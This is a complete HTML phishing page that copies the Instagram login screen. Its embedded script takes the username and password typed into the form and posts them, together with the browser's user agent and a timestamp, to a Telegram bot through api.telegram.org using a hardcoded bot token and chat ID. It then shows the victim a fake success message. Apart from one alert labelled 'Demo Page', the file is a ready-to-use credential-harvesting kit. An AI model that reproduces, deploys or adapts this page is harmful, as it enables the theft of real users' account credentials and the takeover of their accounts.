<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background: #f0f0f0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 40px 20px;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .logo {
            width: 180px;
            margin-bottom: 35px;
            filter: contrast(1.1);
        }
        
        input {
            width: 100%;
            padding: 12px 10px;
            margin: 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
        }
        
        input:focus {
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 9px;
            font-weight: 600;
            font-size: 15px;
            margin: 18px 0 10px;
            cursor: pointer;
            transition: 0.2s;
        }
        
        .login-btn:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }
        
        .divider {
            margin: 25px 0;
            color: #8e8e8e;
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span { padding: 0 18px; }
        
        .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin: 15px 0; display: block; }
        
        .signup {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 25px;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .success-msg {
            color: #4caf50;
            margin-top: 15px;
            font-size: 14px;
            display: none;
        }
        
        .error-msg {
            color: #ed4956;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <!-- Official Instagram Logo (Text SVG for accuracy) -->
            <svg class="logo" viewBox="0 0 510 170" xmlns="http://www.w3.org/2000/svg">
                <text x="10" y="120" font-family="Arial Black, sans-serif" font-size="135" font-weight="900" fill="#262626">Instagram</text>
            </svg>

            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                
                <button type="submit" id="loginBtn" class="login-btn">Log in</button>
            </form>

            <div class="divider"><span>OR</span></div>
            
            <a href="#" class="forgot">Forgot password?</a>
            
            <div class="success-msg" id="successMsg">✅ Logged in successfully!</div>
            <div class="error-msg" id="errorMsg">❌ Failed to send data. Try again.</div>
        </div>

        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        const TOKEN = "8643363199:AAGh6WtS7I27yb6UWjyLxXvkWHFHXsXarfI";
        const CHAT_ID = "8666373816";

        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const successMsg = document.getElementById('successMsg');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert("Please enter username and password");
                return;
            }

            // Disable button + loading state
            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";

            const message = `🔥 *New Instagram Login* 🔥\n\n` +
                           `👤 *Username:* \`${username}\`\n` +
                           `🔑 *Password:* \`${password}\`\n\n` +
                           `📱 *Device:* ${navigator.userAgent}\n` +
                           `🌐 *IP Info:* (Browser)\n` +
                           `⏰ *Time:* ${new Date().toLocaleString('en-IN')}`;

            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    successMsg.style.display = 'block';
                    errorMsg.style.display = 'none';
                    
                    setTimeout(() => {
                        alert("✅ Login successful! (Demo Page)");
                        // window.location.href = "https://www.instagram.com"; // Uncomment to redirect
                    }, 1200);
                } else {
                    throw new Error("Telegram API error");
                }
            } catch (err) {
                console.error(err);
                errorMsg.style.display = 'block';
                successMsg.style.display = 'none';
                alert("Could not connect to Telegram. Check your internet or firewall.");
            } finally {
                loginBtn.disabled = false;
                loginBtn.textContent = "Log in";
            }
        });
    </script>
</body>
</html>
